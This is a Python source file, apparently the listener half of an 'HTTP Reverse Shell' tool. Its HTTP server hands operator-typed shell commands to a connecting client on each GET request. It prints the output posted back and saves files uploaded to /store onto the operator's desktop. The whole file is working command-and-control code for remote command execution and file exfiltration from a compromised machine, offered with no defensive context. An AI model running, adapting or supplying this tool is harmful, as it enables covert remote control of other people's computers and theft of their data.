import http.server
import cgi

HOST = '127.0.0.1'
PORT = 80




class Handler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):

        command = input("\nShell> ")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())
        if command == 'terminate' or command == 'exit' or command == 'quit' :
            print('\n[!] Server is terminated')
            exit()

    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, dic = cgi.parse_header(self.headers['content-type'])
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile,
                                          headers=self.headers,
                                          environ={'REQUEST_METHOD': 'POST'})
                else:
                    print("[-] Unexpected POST request")

                fs_up = fs['file']
                filename = input("\nPlease input File Name :")
                with open(r'C:\Users\Shawqi\Desktop\ ' + filename, 'wb') as o:
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
                    print("\n[+] Transfer Completed")

            except Exception as e:
                print('Error:', end=' ')
                print(e)

            return

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())


if __name__ == "__main__":

    print('''\n
╦ ╦╔╦╗╔╦╗╔═╗  ╦═╗┌─┐┬  ┬┌─┐┬─┐┌─┐┌─┐  ╔═╗┬ ┬┌─┐┬  ┬  
╠═╣ ║  ║ ╠═╝  ╠╦╝├┤ └┐┌┘├┤ ├┬┘└─┐├┤   ╚═╗├─┤├┤ │  │  
╩ ╩ ╩  ╩ ╩    ╩╚═└─┘ └┘ └─┘┴└─└─┘└─┘  ╚═╝┴ ┴└─┘┴─┘┴─┘
\n''')
    print("waiting for the Client...\n")
    server_class = http.server.HTTPServer
    httpd = server_class((HOST, PORT), Handler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("^C \n[!] Server is terminated")
        httpd.server_close()
